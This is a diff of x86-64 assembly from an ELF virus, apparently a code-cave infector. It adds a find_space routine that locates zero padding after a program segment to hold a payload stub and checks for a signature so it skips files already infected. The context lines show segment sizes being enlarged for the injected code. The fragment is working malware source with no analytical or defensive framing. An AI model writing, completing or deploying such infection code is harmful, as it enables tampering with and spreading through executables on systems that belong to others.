@@ -392,9 +392,40 @@ do_infect:
         add QWORD [r14 + Elf64_Phdr.p_filesz], rax
         add QWORD [r14 + Elf64_Phdr.p_memsz], rax
     .return:
-        pop r15
-        pop r14
-        pop r13
+        pop rdi
+        pop rcx
+        ret
+
+; size_t find_space(r15=Elf64_Ehdr*, r14=Elf64_Phdr*)
+find_space:
+    log find_space_msg, 11
+    push rax
+    push rcx
+    push rsi
+
+    mov rax, QWORD [r14 + Elf64_Phdr.p_offset]
+    add rax, QWORD [r14 + Elf64_Phdr.p_filesz]
+    lea rdi, [r15 + rax]
+
+    mov rsi, rdi
+    xor rax, rax
+    mov rcx, STUB_SIZE
+    repz scasb
+    test rcx, rcx
+    ja .no_space
+
+    mov rax, [rel signature]
+    cmp rax, QWORD [rsi - (_end - signature)]
+    jz .already_infected
+    mov rdi, rsi
+    jmp .return
+    .no_space:
+    .already_infected:
+        xor rdi, rdi
+    .return:
+        pop rsi
+        pop rcx
+        pop rax
         ret
 
 ; void *try_map_host(rdi=len, rsi=callback)
